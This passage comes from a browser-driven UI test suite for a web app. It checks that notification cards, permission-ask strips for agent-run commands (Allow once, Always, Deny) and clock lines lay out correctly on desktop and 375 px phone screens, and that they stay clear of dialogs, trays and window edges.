    const e1 = await A.evalJs(`(async () => { const s = document.querySelector('.ut-announce'); const t0 = performance.now(); app.showNewSessionDialog(); await new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r))); return { aside: getComputedStyle(s).visibility === 'hidden', ms: Math.round(performance.now() - t0), open: !document.getElementById('dialog-overlay').classList.contains('hidden') }; })()`);
    await A.evalJs(`(() => { const o = document.getElementById('dialog-overlay'); (o.querySelector('.dialog-close, [data-close], .btn-cancel') || {}).click?.(); if (!o.classList.contains('hidden')) document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); return 1; })()`); await sleep(400);
    check(`RED-able (r14 — 5b4b36649 asked at its 1 s tick only: up to a second over the act just opened): a dialog opened while a card stands ⇒ the stack steps aside AT the open (${e1 && (e1.aside ? 'aside' : 'still shown')} ${e1 && e1.ms} ms after, two frames)`, !!e1 && e1.open && e1.aside, e1);
    await A.evalJs(`(() => { const w = ${CHAT(s21)}; if (w.isMaximized) app.wm.toggleMaximize(w.id); return 1; })()`);
    // (c3) r15 MINOR 2 (the r14 acceptance: a LATE run's line, one line and no ellipsis, ran past a 700 px window's edge): a chat
    // window 700 px wide, a late run and a late run after a restart — the clock's line wraps inside the window, every word of it
    await A.evalJs(`(() => { const w = ${CHAT(s21)}; if (w.isMaximized) app.wm.toggleMaximize(w.id); app.wm.focusWindow?.(w.id); app.wm.resizeWindowTo(w.id, { w: 700, h: 640 }); return 1; })()`); await sleep(900);
    const lateAt = { createdAt: Date.now() - 95e3, expiresAt: Date.now() - 35e3 };
    const L15 = [['late', runV('ut-r15late5', { ...FXR }, { late: true }, lateAt), /goes through \(once\)$/], ['lost', runV('ut-r15lost6', { ...FXR }, { late: true, restartLost: true }, lateAt), /its next run asks again$/]];
    const l15 = {};
    for (const [k, it, end] of L15) {
      await A.evalJs(PUSH21(`[${J(it)}]`)); await A.waitFor(`!!${CHAT(s21)}.element.querySelector('.chat-attn-dock .ut-item[data-id="${it.id}"] .ut-deadline')`, 8000); await sleep(700);
      await A.evalJs(noToasts);
      const m = await A.evalJs(RUNM_OF(it.id));
      const onStrip = await A.evalJs(`(() => { const s = document.querySelector('.ut-announce'), d = ${CHAT(s21)}.element.querySelector('.chat-attn-dock'); if (!s || !d || getComputedStyle(s).visibility === 'hidden') return false; const a = s.getBoundingClientRect(), b = d.getBoundingClientRect(); return a.left < b.right && a.right > b.left && a.top < b.bottom && a.bottom > b.top; })()`); // r15: the strip grew under the stack — it follows at once
      l15[k] = m && { ...m, onStrip, ends: end.test((m.clock || '').trim()), win: await A.evalJs(`Math.round(${CHAT(s21)}.element.getBoundingClientRect().width)`) };
      if (k === 'late') await A.shot('desktop-700-dock-late.png');
    }
    const inWin = (v) => !!v && !!v.dl && v.dl.r <= v.wr && v.dl.clip <= 1 && v.over <= 1 && v.ends && !v.onStrip; // (r15: and no announce card on the strip that grew — 700 ms after, never the next tick)
    check(`RED-able (r15 — 2353267f1: «flex: none; white-space: nowrap» — the late line cut at the window's edge): a chat window ${l15.late && l15.late.win} px wide — a late run's clock line («${l15.late && l15.late.clock}», ${l15.late && l15.late.dl && (l15.late.dl.b - l15.late.dl.t)} px tall) and a late run's after a restart (${l15.lost && l15.lost.dl && (l15.lost.dl.b - l15.lost.dl.t)} px tall) wrap inside it, every word (right edges ${l15.late && l15.late.dl && l15.late.dl.r} / ${l15.lost && l15.lost.dl && l15.lost.dl.r} ≤ the window's ${l15.late && l15.late.wr})`,
      inWin(l15.late) && inWin(l15.lost) && l15.late.win <= 702, l15);
    await A.evalJs(PUSH21('d.todos.open')); await sleep(600);
    // (f) THE PHONE (375 × 812, touch): a card arriving while the phone's For-you page shows steps aside; the stack's layer is under the tray's
    await A.device(375, 812); await A.load();
    // (the load's own restore settles first — a window it creates or focuses on the phone hides the page: window.js _mobileYieldSidebar)
    await A.waitFor(`document.documentElement.dataset.vc === 'compact' && !!app.phoneHome && !app.layoutManager?._restoring && !app.layoutManager?._applying`, 15000); await sleep(1000);
    const SHOWH = `(() => { const p = document.getElementById('user-todos-popup'); if (p && !p.classList.contains('hidden')) document.getElementById('taskbar-user-todos').click(); if (!app.phoneHome.shown()) app.phoneHome.show(); return app.phoneHome.shown(); })()`;
    const HOME = (id) => `(() => { const s = document.querySelector('.ut-announce'), c = s && s.querySelector('.uta-card[data-id="${id}"]'); if (!c) return null; const r = c.getBoundingClientRect(), h = document.elementFromPoint(r.left + r.width / 2, r.top + r.height / 2);
      const D = (e) => (e.id ? '#' + e.id : (e.className || e.tagName).toString().split(' ')[0]).slice(0, 24), hm = document.getElementById('phone-home'), hr = hm && hm.getBoundingClientRect();
      return { home: !!app.phoneHome?.shown?.(), aside: getComputedStyle(s).visibility === 'hidden', inAnn: !!h && !!h.closest('.ut-announce'), inHome: !!h && !!h.closest('#phone-home'), z: Number(getComputedStyle(s).zIndex),
        chain: document.elementsFromPoint(r.left + r.width / 2, r.top + r.height / 2).slice(0, 7).map(D), homeBox: hr ? [Math.round(hr.left), Math.round(hr.top), Math.round(hr.right), Math.round(hr.bottom), getComputedStyle(hm).display, getComputedStyle(hm).zIndex] : null }; })()`;
    // THE PRECONDITION, checked each try (the full suite: a window the load restored is focused late — window.js focusWindow →
    // _mobileYieldSidebar hides the page — after the card arrived): the page shown when the card arrives AND when it is measured;
    // a try whose page the environment hid is said and tried again with a NEW ask (a re-show would put the cards away — annYield)
    let h1 = null, tries = 0;
    for (; tries < 3; tries++) {
      for (let k = 0; k < 3; k++) { await A.evalJs(SHOWH); await sleep(800); if (await A.evalJs(`!!app.phoneHome.shown() && getComputedStyle(document.getElementById('phone-home')).display !== 'none'`)) break; }
      const hid = 'ut-r14home' + (tries + 1);
      await A.evalJs(PUSH21(`[${J(ex21(hid, 'echo home'))}]`)); await A.waitFor(`!!document.querySelector('.ut-announce .uta-card[data-id="${hid}"]')`, 8000); await sleep(1300);
      await A.evalJs(noToasts);
      h1 = await A.evalJs(HOME(hid));
      if (h1 && h1.home) break;
      console.log(`    (㉑ f: try ${tries + 1} — the page was hidden under the card by the environment ${J(h1 && h1.chain)}; again with a new ask)`);
    }
    if (h1) h1.tries = tries + 1;
    await A.shot('phone-375-announce-over-home.png');
    check(`RED-able (r14 — 5b4b36649 had no #phone-home in its list: a card arriving while the phone's For-you page shows stood over it — the tray bug's shape on the phone): the page shown (try ${h1 && h1.tries}), a card arrives ⇒ the stack steps aside (${h1 && (h1.aside ? 'hidden, its card kept' : 'shown')}), the page is what a tap at the card's place reaches (${h1 && (h1.inHome ? '#phone-home' : h1.inAnn ? 'the card' : '?')})`,
      !!h1 && h1.home && h1.aside && !h1.inAnn && h1.inHome, h1);
    // the tray SHEET (the phone's media list lays .usage-popup out full width under the nav — the compact badge opens the page,
    // so the sheet is opened by its own handler here): a card arriving while it is open stands UNDER it
    await A.evalJs(`(() => { app.phoneHome?.hide?.(); return 1; })()`); await sleep(400);
    await A.evalJs(`(() => { document.getElementById('taskbar-user-todos').click(); return 1; })()`); await A.waitFor(`(() => { const p = document.getElementById('user-todos-popup'); return !p.classList.contains('hidden') && p.getBoundingClientRect().height > 40; })()`, 6000); await sleep(400);
    await A.evalJs(PUSH21(`[${J(ex21('ut-r14tray1', 'echo tray'))}]`)); await A.waitFor(`!!document.querySelector('.ut-announce .uta-card[data-id="ut-r14tray1"]')`, 8000); await sleep(1300);
    await A.evalJs(noToasts);
    const t1 = await A.evalJs(`(() => { const s = document.querySelector('.ut-announce'), c = s && s.querySelector('.uta-card[data-id="ut-r14tray1"]'), p = document.getElementById('user-todos-popup'); if (!c) return null; const r = c.getBoundingClientRect(), h = document.elementFromPoint(r.left + r.width / 2, r.top + r.height / 2);
      const D = (e) => (e.id ? '#' + e.id : (e.className || e.tagName).toString().split(' ')[0]).slice(0, 24), pr = p.getBoundingClientRect();
      return { z: Number(getComputedStyle(s).zIndex), tray: Number(getComputedStyle(p).zIndex), aside: getComputedStyle(s).visibility === 'hidden', inTray: !!h && !!h.closest('#user-todos-popup'), inAnn: !!h && !!h.closest('.ut-announce'),
        chain: document.elementsFromPoint(r.left + r.width / 2, r.top + r.height / 2).slice(0, 7).map(D), card: [Math.round(r.left), Math.round(r.top), Math.round(r.right), Math.round(r.bottom)], trayBox: [Math.round(pr.left), Math.round(pr.top), Math.round(pr.right), Math.round(pr.bottom)] }; })()`);
    await A.shot('phone-375-announce-under-tray.png');
    check(`RED-able (r14 — 5b4b36649: 99990 over the phone's tray 90001 and mini inbox 90002, only a 1 s rectangle check between): ONE z table on the phone — the stack's ${t1 && t1.z} stands under the tray's ${t1 && t1.tray}; a card arriving while the tray is open is under it (${t1 && (t1.inTray ? 'the tray' : t1.inAnn ? 'the card' : '?')} at its place)`,
      !!t1 && t1.z < t1.tray && t1.inTray && !t1.inAnn, t1);
    await A.evalJs(`(() => { const p = document.getElementById('user-todos-popup'); if (p && !p.classList.contains('hidden')) document.getElementById('taskbar-user-todos').click(); return 1; })()`); await sleep(400);
    // …and the run ask's strip at 375: its head folds to one line, its three answers wrap to their own row, its clock shown
    await A.evalJs(`(() => { app.phoneHome?.hide?.(); for (const w of [...app.wm.windows.values()]) if (w.type === 'chat' && app.sessions.get(w.id)?.sessionId !== ${J(s21)}) app.wm.closeWindow(w.id); if (!${CHAT(s21)}) app.attachSession(${J(s21)}, 'clear', ${J(WORK)}, { mode: 'chat', backend: 'claude' }); return 1; })()`);
    await A.waitFor(`!!${CHAT(s21)}`, 8000); await sleep(800);
    await A.evalJs(PUSH21(`[${J({ ...RUN21, createdAt: Date.now() - 5e3, expiresAt: Date.now() + 55e3 })}]`)); await A.waitFor(`!!${CHAT(s21)}.element.querySelector('.chat-attn-dock .ut-item[data-id="ut-r14run01"]')`, 8000); await sleep(800);
    const fc14 = await A.evalJs(`(() => { const d = ${CHAT(s21)}.element.querySelector('.chat-attn-dock'), c = d && d.querySelector(':scope > .cad-clock'); return { folded: !!d && !d.classList.contains('cad-open'), vis: !!c && c.getClientRects().length > 0, text: c ? c.textContent : null, h: d ? Math.round(d.getBoundingClientRect().height) : 0 }; })()`);
    check(`r14 (lane phone-dock-restore r2 — the deadline law: a card with a deadline shows its time left everywhere it renders) the run ask's FOLDED strip at 375 shows its clock on its one row («${fc14 && fc14.text}», ${fc14 && fc14.h} px)`, !!fc14 && fc14.folded && fc14.vis && /\d/.test(fc14.text || '') && fc14.h <= 56, fc14);
    await openStrip(A); // (lane phone-dock-restore: the phone's row opened — the run card as before)
    const r2 = await A.evalJs(RUNM);
    const top2 = await A.evalJs(`(() => { const row = ${CHAT(s21)}.element.querySelector('.chat-attn-dock .ut-item[data-id="ut-r14run01"]'); return row ? [...row.querySelectorAll('.ut-run-answer > button')].map((b) => { const q = b.getBoundingClientRect(), h = document.elementFromPoint(q.left + q.width / 2, q.top + q.height / 2); return h === b || b.contains(h) ? 'own' : h ? (h.closest('#global-toasts') ? 'toast' : h.closest('.ut-announce') ? 'announce' : (h.className || h.tagName).toString().slice(0, 30)) : 'none'; }) : []; })()`); // (the arrival toasts STAND: on this tier they rise above the composer — r14: and above the strip)
    await A.shot('phone-375-dock-run.png');
    check(`r14 the run ask's strip at 375 (touch): the command head on one line («${r2 && r2.cmd && r2.cmd.text}»), the three answers (${J(r2 && r2.ans.map((a) => a.k + ' ' + (a.b - a.t) + 'px'))}) each ≥ 44 px, inside the window and the topmost thing where a tap lands — the arrival toasts standing (${J(top2)}; the phone's toasts stood over the strip's answers before r14), the clock («${r2 && r2.clock}»); r15: what they decide on («${r2 && r2.gist && r2.gist.text}», inside the screen)`,
      !!r2 && r2.ans.map((a) => a.k).join() === 'once,always,deny' && r2.ans.every((a) => a.b - a.t >= 44 && a.l >= 0 && a.r <= r2.vw) && top2.length === 3 && top2.every((x) => x === 'own') && !!r2.cmd && r2.cmd.h <= 24 && !!r2.clock && r2.over <= 1 && !!r2.gist && /Sends to db\.example\.com/.test(r2.gist.text) && r2.gist.r <= r2.vw && r2.gist.clip <= 1, { r2, top2 });
    // …and a program an agent can write, at 375: its warning row whole on the phone, Allow once / Deny
    const W375 = runV('ut-r15writ7', { ...FXR, tool: { ...FXR.tool, path: '~/workspace/ops/bin/psql', writable: true }, always: { offered: false, why: 'program-writable', directive: null } }, { always: false });
    await A.evalJs(PUSH21(`[${J(W375)}]`)); await A.waitFor(`!!${CHAT(s21)}.element.querySelector('.chat-attn-dock .ut-item[data-id="ut-r15writ7"]')`, 8000); await sleep(800);
    await A.evalJs(noToasts);
    await openStrip(A); // (lane phone-dock-restore: a newer item folded the row — opened again)
    const w2 = await A.evalJs(RUNM_OF('ut-r15writ7'));
    await A.shot('phone-375-dock-run-writable.png');
    const w2r = w2 && w2.gist && w2.gist.rows.find((r) => r.k === 'program');
    check(`r15 at 375 (touch): a program an agent can write — its warning row («${w2r && w2r.text}») whole inside the screen (right ${w2r && w2r.r} ≤ ${w2 && w2.vw}), beside ${J(w2 && w2.ans.map((a) => a.k))}`,
      !!w2r && w2r.warn && /in a folder an agent can write/.test(w2r.text) && w2r.r <= w2.vw && w2.gist.clip <= 1 && w2.ans.map((a) => a.k).join() === 'once,deny' && w2.over <= 1, w2);
    await A.evalJs(PUSH21('d.todos.open')); await sleep(400);
    await A.device(1280, 800, { mouse: true }); await A.load(); await sleep(600);
  } catch (e) { fail++; console.log('  ✗ ㉑ threw: ' + (e?.message || e)); }
  lap('㉑ done');

  console.log('㉒ A HELD STACK OBEYS THE FREE ONE\'S RULE · A STRIP\'S SIZE HAS ONE ROAD · A BROADCAST READS NO STRIP\'S LAYOUT (lane needs-card-tail r16 — the r15 acceptance: the mouse on the second card, the top one gone — the stack ran onto the For-you button and a maximized chat\'s strip; chromeMoved read layout on every pass and missed a re-wrap)');
  try {
    await A.front(); await A.device(1280, 800, { mouse: true });
    const R22 = `const R = (e) => { if (!e) return null; const r = e.getBoundingClientRect(); return r.width && r.height ? { l: Math.round(r.left), t: Math.round(r.top), r: Math.round(r.right), b: Math.round(r.bottom) } : null; };`;
    const PUSH22 = (list) => `(async () => { const d = await (await fetch('/api/user-todos')).json(); const todos = d.todos; todos.open = ${list}; for (const h of app.ws.globalHandlers) { try { h({ type: 'user-todos-updated', todos }); } catch { } } return 1; })()`;
    const noToasts = `(() => { for (const t of document.querySelectorAll('#global-toasts > .global-toast')) t.remove(); return 1; })()`;
    const mouse = (x, y) => A.cdp('Input.dispatchMouseEvent', { type: 'mouseMoved', x, y });
    const CHATOF = (sid) => `[...app.wm.windows.values()].find((w) => w.type === 'chat' && app.sessions.get(w.id)?.sessionId === ${J(sid)})`;
    const s22 = await newConv('held'); await sleep(600); sayTo(s22, 'hello'); await sleep(1500);
    await A.evalJs(`(() => { app.phoneHome?.hide?.(); for (const w of [...app.wm.windows.values()]) app.wm.closeWindow(w.id); app.attachSession(${J(s22)}, 'held', ${J(WORK)}, { mode: 'chat', backend: 'claude' }); return 1; })()`);
    await A.waitFor(`!!${CHATOF(s22)}`, 8000); await sleep(1000);
    const KEY22 = await A.evalJs(`(app.foryouRows.keysForWin(${CHATOF(s22)}.id) || [])[0] || null`);
    await A.evalJs(`(() => { app.wm.closeWindow(${CHATOF(s22)}.id); return 1; })()`); await sleep(600); // (a), (b): nothing by the For-you button but the button
    const T22 = Date.now(), ex22 = (id, at) => ({ id, sessionKey: KEY22, status: 'open', kind: 'action', origin: 'machines', urgency: 'urgent', createdAt: at, expiresAt: T22 + 3600e3,
      text: `Allow "held" to run step ${id.slice(-1)} on exmac?`, detail: 'echo ' + id, action: { type: 'exit-run-ask', askId: id.slice(-1).repeat(32), machine: 'exmac', cmd: 'echo ' + id } });
    const STK = `(() => { ${R22} const s = document.querySelector('.ut-announce'); if (!s) return null; const kids = [...s.children].filter((e) => !e.hidden && e.getClientRects().length).map((e) => ({ id: e.dataset.id || 'more', ...R(e) }));
      const w = [...app.wm.windows.values()].find((x) => x.type === 'chat' && !x.isMinimized), q = (sel) => (w ? R(w.element.querySelector(sel)) : null);
      return { stack: R(s), kids, btn: R(document.getElementById('taskbar-user-todos')), strip: q('.chat-attn-dock'), comp: q('.chat-input-area'), aside: getComputedStyle(s).visibility === 'hidden', hover: s.matches(':hover') }; })()`;
    const meets = (a, b) => !!a && !!b && a.l < b.r && a.r > b.l && a.t < b.b && a.b > b.t;
    // the mouse rests on the SECOND card; the top one is answered elsewhere (the snapshot without it); then the mouse leaves
    const heldCase = async (n, tag, shot) => {
      await A.evalJs(PUSH22('[]')); await A.waitFor(`!document.querySelector('.ut-announce .uta-card')`, 6000); await sleep(400);
      const items = Array.from({ length: n }, (_, k) => ex22(`ut-r16${tag}${k + 1}`, T22 - (n - k) * 1000));
      await A.evalJs(PUSH22(J(items))); await A.waitFor(`document.querySelectorAll('.ut-announce .uta-card').length === ${n}`, 8000); await sleep(1300);
      await A.evalJs(noToasts);
      const free = await A.evalJs(STK), k2 = free && free.kids[1];
      if (!k2) return { free };
      await mouse((k2.l + k2.r) / 2, (k2.t + k2.b) / 2); await sleep(500);
      const pinned = await A.evalJs(STK);
      await A.evalJs(PUSH22(J(items.slice(0, n - 1)))); await sleep(1600); // (two ticks of the stack's own clock after it)
      await A.evalJs(noToasts);
      const held = await A.evalJs(STK);
      await A.shot(shot);
      await mouse(40, 300); await sleep(700);
      const after = await A.evalJs(STK);
      const pin = (v) => v && v.kids.find((x) => x.id === k2.id);
      return { free, pinned, held, after, pinId: k2.id, pinAt: pin(pinned), pinNow: pin(held), gone: !!held && !held.kids.some((x) => x.id === items[n - 1].id) };
    };
    const sameR = (a, b) => !!a && !!b && a.l === b.l && a.t === b.t && a.r === b.r && a.b === b.b;
    const byBtn = (v) => !!v && !!v.held && v.gone && v.held.hover && sameR(v.pinAt, v.pinNow) && v.held.kids.every((x) => x.b <= v.held.btn.t) && !!v.after && v.after.kids.every((x) => !meets(x, v.after.btn));
    // (a) four cards, (b) five, by the For-you button
    const h4 = await heldCase(4, 'a', 'desktop-1280-held-four.png'), h5 = await heldCase(5, 'b', 'desktop-1280-held-five.png');
    check(`RED-able (r16 — 882665da7: the card folded into «N more» unfolded below the read one — 4 cards ran onto the For-you button, 5 moved the read card by the clamp): the mouse on the second card, the top one answered elsewhere ⇒ the read card keeps ${J(h4.pinAt)} → ${J(h4.pinNow)} (4 cards: ${J(h4.held && h4.held.kids.map((x) => [x.t, x.b]))}), ${J(h5.pinAt)} → ${J(h5.pinNow)} (5 cards: ${J(h5.held && h5.held.kids.map((x) => [x.t, x.b]))}) — nothing below the button's top ${h4.held && h4.held.btn && h4.held.btn.t}; the mouse gone ⇒ the stack clear of the button`,
      byBtn(h4) && byBtn(h5), { h4, h5 });
    // (c) a maximized chat: its strip and composer under the stack's place — the same press
    await A.evalJs(`(() => { app.attachSession(${J(s22)}, 'held', ${J(WORK)}, { mode: 'chat', backend: 'claude' }); return 1; })()`); await A.waitFor(`!!${CHATOF(s22)}`, 8000); await sleep(800);
    await A.evalJs(`(() => { const w = ${CHATOF(s22)}; app.wm.focusWindow?.(w.id); if (!w.isMaximized) app.wm.toggleMaximize(w.id); return 1; })()`); await sleep(900);
    const hm = await heldCase(4, 'c', 'desktop-1280-held-maxchat.png'), hm5 = await heldCase(5, 'd', 'desktop-1280-held-maxchat-five.png');
    const clearMax = (v) => !!v && !!v.held && v.gone && v.held.hover && sameR(v.pinAt, v.pinNow) && !!v.held.strip && !!v.held.comp && v.held.kids.every((x) => !meets(x, v.held.strip) && !meets(x, v.held.comp));
    check(`RED-able (r16 — 882665da7: 318–560 → 390–600 / 390–632 on the strip's Allow / Deny): a maximized chat — the mouse on the second card, the top one answered elsewhere ⇒ the read card keeps ${J(hm.pinAt)} → ${J(hm.pinNow)}; the cards ${J(hm.held && hm.held.kids.map((x) => [x.t, x.b]))} (5: ${J(hm5.held && hm5.held.kids.map((x) => [x.t, x.b]))}) — nothing over the strip ${J(hm.held && hm.held.strip)} or the composer ${J(hm.held && hm.held.comp)}`,
      clearMax(hm) && clearMax(hm5), { hm, hm5 });
    await A.evalJs(PUSH22('[]')); await sleep(600);
    // (d) THE ONE ROAD: the strip re-wraps at its clock's words (tickDeadlines writes them — no broadcast, no _dockPass) and at
    // a window's resize ⇒ the stack is re-placed IN THAT FRAME (foryouRows.chromeMoved from the strip's observer), once a frame
    const FX22 = JSON.parse(fs.readFileSync(new URL('./fixtures/vault-run-card-facts.json', import.meta.url), 'utf8')).variants.find((v) => v.name === 'hosts-known-always').facts;
    const RUN22 = (exp) => ({ id: 'ut-r16clock', sessionKey: KEY22, status: 'open', kind: 'action', origin: 'vault', by: 'agent', urgency: 'urgent', text: 'held wants to run a command with a stored secret', detail: 'Program: psql', createdAt: T22, expiresAt: exp,
      action: { type: 'vault-run-ask', askId: 'c'.repeat(32), always: true, tool: 'x' }, facts: FX22 });
    await A.evalJs(`(() => { const w = ${CHATOF(s22)}; if (w.isMaximized) app.wm.toggleMaximize(w.id); app.wm.focusWindow?.(w.id); return 1; })()`); await sleep(600);
    const AT22 = (W) => `(() => { const w = ${CHATOF(s22)}; app.wm.resizeWindowTo(w.id, { w: ${W}, h: 520 }); const ws = app.wm.workspace.getBoundingClientRect(); w.element.style.left = Math.max(0, ws.width - ${W} - 8) + 'px'; w.element.style.top = Math.max(0, ws.height - 520 - 8) + 'px'; return 1; })()`;
    await A.evalJs(AT22(560)); await sleep(500);
    // the ask's clock by the SERVER's time (its line counts by hubNow — the snapshot's `now`), a fresh id each try; THE
    // PRECONDITION is said and tried again (the full suite's runner-fonts run on 3a30a2cd5 saw no size change after the watch
    // went on): the clock still «… left» when the watch goes on, its words turning after it, the strip changing size at the turn
    const PUSHCLK = (id, inMs) => `(async () => { const d = await (await fetch('/api/user-todos')).json(); const todos = d.todos, base = Number(todos.now) || Date.now(); const it = ${J(RUN22(0))}; it.id = ${J(id)}; it.action.askId = ${J(id)}.slice(-1).repeat(32); it.expiresAt = base + ${inMs}; todos.open = [it]; for (const h of app.ws.globalHandlers) { try { h({ type: 'user-todos-updated', todos }); } catch { } } return 1; })()`;
    // the width at which the clock's «time is up» words take one more line than its «… left» words — both in the warn style the
    // line wears near its end; the dock's height measured with each, restored in the same task (nothing laid out between)
    const SWEEP22 = `(() => { const w = ${CHATOF(s22)}, d = w.element.querySelector('.chat-attn-dock'), dl = d.querySelector('.ut-deadline'), due = "time is up by the server's clock — waiting for the server", ws = app.wm.workspace.getBoundingClientRect();
      for (let W = 760; W >= 300; W -= 8) { app.wm.resizeWindowTo(w.id, { w: W, h: 520 }); w.element.style.left = Math.max(0, ws.width - W - 8) + 'px'; const t0 = dl.textContent, w0 = dl.classList.contains('ut-deadline-warn'); dl.classList.add('ut-deadline-warn'); const h1 = d.offsetHeight; dl.textContent = due; const h2 = d.offsetHeight; dl.textContent = t0; dl.classList.toggle('ut-deadline-warn', w0); if (h2 > h1 + 4) return W; }
      return null; })()`;
    const READ22 = `(() => { ${R22} const s = document.querySelector('.ut-announce'), d = ${CHATOF(s22)}.element.querySelector('.chat-attn-dock'); return { ...JSON.parse(JSON.stringify(window.__cm22 || {})), stack: R(s), strip: R(d), clock: (d.querySelector('.ut-deadline') || {}).textContent || '', aside: !!s && getComputedStyle(s).visibility === 'hidden' }; })()`;
    const WATCH22 = `(() => { if (window.__cmF22) app.foryouRows.chromeMoved = window.__cmF22; window.__ro22?.disconnect(); window.__mo22?.disconnect();
      const d = ${CHATOF(s22)}.element.querySelector('.chat-attn-dock'), f = app.foryouRows.chromeMoved, dl = () => d.querySelector('.ut-deadline'); window.__cm22 = { placed: [], calls: 0, sizes: [], dueAt: 0 }; window.__cmF22 = f;
      app.foryouRows.chromeMoved = () => { const r = f(); window.__cm22.calls++; if (r) window.__cm22.placed.push(performance.now()); return r; };
      (window.__mo22 = new MutationObserver(() => { if (!window.__cm22.dueAt && /time is up/.test((dl() || {}).textContent || '')) window.__cm22.dueAt = performance.now(); })).observe(d, { childList: true, characterData: true, subtree: true });
      (window.__ro22 = new ResizeObserver(() => window.__cm22.sizes.push({ at: performance.now(), h: d.offsetHeight }))).observe(d); return /left/.test((dl() || {}).textContent || ''); })()`;
    const clockTry = async (k) => {
      const id = 'ut-r16clk' + k, DL = `${CHATOF(s22)}.element.querySelector('.chat-attn-dock .ut-item[data-id="${id}"] .ut-deadline')`;
      await A.evalJs(AT22(560)); await sleep(400);
      await A.evalJs(PUSHCLK(id, 24000)); await A.waitFor(`!!${DL} && /left/.test(${DL}.textContent)`, 8000); await sleep(400);
      const W = await A.evalJs(SWEEP22);
      if (W) await A.evalJs(AT22(W));
      await sleep(800); await A.evalJs(noToasts);
      const live = await A.evalJs(WATCH22);
      await A.waitFor(`/time is up/.test((${DL} || {}).textContent || '')`, 32000); await sleep(500);
      const v = await A.evalJs(READ22);
      return { ...v, W, live, id, after: (v.sizes || []).filter((z) => v.dueAt && z.at >= v.dueAt - 1) };
    };
    let rw = null, tries22 = 0;
    for (; tries22 < 3; tries22++) {
      rw = await clockTry(tries22 + 1);
      if (rw.live && rw.dueAt && rw.after.length > 0) break;
      console.log(`    (㉒ d: try ${tries22 + 1} — ${!rw.live ? 'the clock was past «left» when the watch went on' : !rw.dueAt ? 'its words never turned' : 'the strip kept its size at the turn'} (${rw.W} px); again with a fresh ask)`);
    }
    const W22 = rw.W;
    // r17 (the r16 acceptance's shots: a 592 px window's «Always let this conversation use it (these hosts)» past its edge, Deny
    // outside it; ~670 px Deny clipped): EVERY ANSWER INSIDE THE WINDOW — each visible button of the strip against the window's
    // and the strip's right edges (and the strip's left), the strip never scrolling sideways
    const EDGE22 = `(() => { ${R22} const w = ${CHATOF(s22)}, d = w.element.querySelector('.chat-attn-dock'), wr = R(w.element), dr = R(d); const acts = [...d.querySelectorAll('.ut-act')].filter((e) => e.getClientRects().length).map((e) => ({ w: e.textContent.trim().slice(0, 24), ...R(e) }));
      return { W: wr && wr.r - wr.l, wr, dr, acts, over: acts.filter((a) => a.r > Math.min(wr.r, dr.r) + 0.5 || a.l < dr.l - 0.5), scrolls: d.scrollWidth > d.clientWidth + 1 }; })()`;
    const e1 = await A.evalJs(EDGE22);
    await A.shot('desktop-dock-clock-rewrap.png');
    const inFrame = (sizes, placed) => sizes.length > 0 && sizes.every((z) => placed.some((p) => Math.abs(p - z.at) < 20)); // (each size the observer saw: a placement in its frame)
    check(`RED-able (r16 — 882665da7: a strip re-wrapped by its clock's words never reached chromeMoved — the stack followed at the 1 s tick): a ${W22} px chat at the For-you button's side (try ${Math.min(tries22, 2) + 1}), its clock turned to «${(rw.clock || '').trim().slice(0, 40)}…» — the strip ${J((rw.sizes || []).map((z) => z.h))} px, ${J(rw.after.map((z) => z.h))} after the turn ⇒ the stack re-placed in the frame of each (${(rw.placed || []).length} placement(s), ${rw.calls} call(s)); the stack ${J(rw.stack)} clear of the strip ${J(rw.strip)}`,
      !!W22 && rw.live && rw.after.length > 0 && inFrame(rw.after, rw.placed) && rw.placed.length <= rw.calls && !meets(rw.stack, rw.strip), rw);
    const n0 = rw.placed.length, s0 = rw.sizes.length;
    await A.evalJs(AT22(Math.max(300, (W22 || 560) - 150))); await sleep(700);
    const rz = await A.evalJs(READ22), e2 = await A.evalJs(EDGE22);
    await A.shot('desktop-dock-resized.png');
    const newSizes = rz.sizes.slice(s0), newPlaced = rz.placed.slice(n0);
    check(`RED-able (r16 — 882665da7: a window's resize re-wrapped the strip outside _dockPass): the window resized ⇒ the strip ${J(newSizes.map((z) => z.h))} px, the stack re-placed in that frame — ${newPlaced.length} placement(s) for ${newSizes.length} size change(s) (the toasts asked with each); the stack ${J(rz.stack)} clear of the strip ${J(rz.strip)}`,
      newSizes.length >= 1 && newPlaced.length === newSizes.length && newSizes.every((z) => newPlaced.some((p) => Math.abs(p - z.at) < 20)) && !meets(rz.stack, rz.strip), { rz, newSizes, newPlaced });
    // (f) r17 — THE ANSWERS NEVER PASS THE WINDOW'S EDGE: the two shots above, and the acceptance's widths 592 and 670 (the run
    // ask: Allow once · Always let this conversation use it (these hosts) · Deny), each shot
    const edges = [['rewrap', e1], ['resized', e2]];
    for (const W of [592, 670]) { await A.evalJs(AT22(W)); await sleep(700); await A.evalJs(noToasts); edges.push([W, await A.evalJs(EDGE22)]); await A.shot(`desktop-dock-${W}.png`); }
    const edgeOk = edges.every(([, e]) => !!e && e.acts.length >= 2 && !e.over.length && !e.scrolls);
    check(`RED-able (r17 — e77f7a3f6: at 592 px «Always let this conversation use it (these hosts» cut at the window's edge, Deny outside it; at ~670 px Deny clipped): the strip's answers inside the window at every width — ${edges.map(([k, e]) => `${k}: ${e && e.W} px, ${J(e && e.acts.map((a) => [a.w.slice(0, 12), a.l, a.r, a.b - a.t]))}${e && e.over.length ? ' OVER ' + J(e.over) : ''}`).join('; ')}`,
      edgeOk, edges);
    await A.evalJs(`(() => { if (window.__cmF22) app.foryouRows.chromeMoved = window.__cmF22; window.__ro22?.disconnect(); window.__mo22?.disconnect(); delete window.__cm22; delete window.__cmF22; return 1; })()`);
    await A.evalJs(PUSH22('[]')); await sleep(500);
    // (e) THE COST: four open strips, one broadcast that rewords each — the strip's layout reads in the passes (a counted
    // offsetHeight getter on .chat-attn-dock) and the page's layouts (CDP Performance LayoutCount) over the broadcast's frames
    const more22 = []; for (const tag of ['held2', 'held3', 'held4']) { const sid = await newConv(tag); more22.push(sid); sayTo(sid, 'hello'); }
    await sleep(1800);
    const all22 = [s22, ...more22];
    await A.evalJs(`(() => { for (const [k, sid] of ${J(all22)}.entries()) { const w = [...app.wm.windows.values()].find((x) => x.type === 'chat' && app.sessions.get(x.id)?.sessionId === sid); if (!w) app.attachSession(sid, 'strip ' + k, ${J(WORK)}, { mode: 'chat', backend: 'claude' }); } return 1; })()`);
